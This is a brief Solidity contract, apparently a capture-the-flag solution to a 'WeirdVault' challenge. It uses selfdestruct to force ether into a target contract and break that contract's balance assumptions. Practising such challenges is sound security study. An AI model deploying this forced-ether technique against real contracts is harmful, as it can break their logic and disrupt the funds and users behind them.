// SPDX-License-Identifier:GPL-3.0-or-later
pragma solidity 0.7.6;

contract HackWeirdVaultChallenge {
    address instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function hack() external payable {
        selfdestruct(payable(instance));
    }
}
